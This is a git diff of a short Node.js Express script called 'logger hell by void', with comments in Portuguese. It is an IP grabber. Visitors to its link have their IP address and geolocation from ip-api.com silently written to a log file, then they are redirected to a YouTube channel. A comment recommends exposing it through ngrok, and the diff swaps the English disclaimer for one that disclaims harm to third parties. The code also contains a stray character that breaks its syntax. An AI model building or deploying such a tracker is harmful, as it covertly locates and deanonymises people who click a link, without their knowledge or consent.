@@ -1,26 +1,31 @@
 /*
 logger hell by void
 
-## ⚠️ Legal Disclaimer
+use o ngrok ou outra ferrmenta que cria um tunel entre
+a localhost e a internet
 
-This project is for **educational and research purposes only**.
-
-The author is **not responsible** for any misuse, damage, or illegal activities caused by this code.  
-**Use it at your own risk.**
-
-> Unauthorized use against others may lead to **legal consequences** or **account bans**.
+(não me responsabilizo pelo uso dela, ou possiveis danos causados a terceiros)
 
 */
 
 
+
 const express = require("express");
-const {getIpInfo} = require("./getIpInfo")
 const fs = require("fs");
 const app = express();
 const port = 3000;
+const axios = require("axios");
+const link = "https://youtube.com/@void190y?si=2c2UzhxZD7JJ05yC";
 
-const link = "https://youtube.com/@void190y?si=5qpDPayfhCHHDGjL";
 
+function getipinfo(ip) {
+    return axios.get(`http://ip-api.com/json/${ip}`)
+        .then(response => response.data)
+        .catch(err => {
+            console.error("Erro ao buscar IP:", err);
+            return null;
+        });
+}7
 
 
 app.set("trust proxy", true);
@@ -38,18 +43,19 @@ console.log(`
 ============================
 `);
 
-app.get("/", (req, res) => {
+app.get("/", async (req, res) => {
 
   const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+  const dataip = await getipinfo(ip)
 
 
-  fs.appendFile("log.txt", `${ip} \n ${dataIp}\n`, err => {
+  fs.appendFile("log.txt", `${ip} \n ${dataip}\n`, err => {
     if (err) {
       console.log("Erro ao salvar IP");
     }
   });
   console.log(ip,":entrou \n")
-  console.log(dataip,"\n");
+  console.log(dataip);
 
 
   res.redirect(302, link);
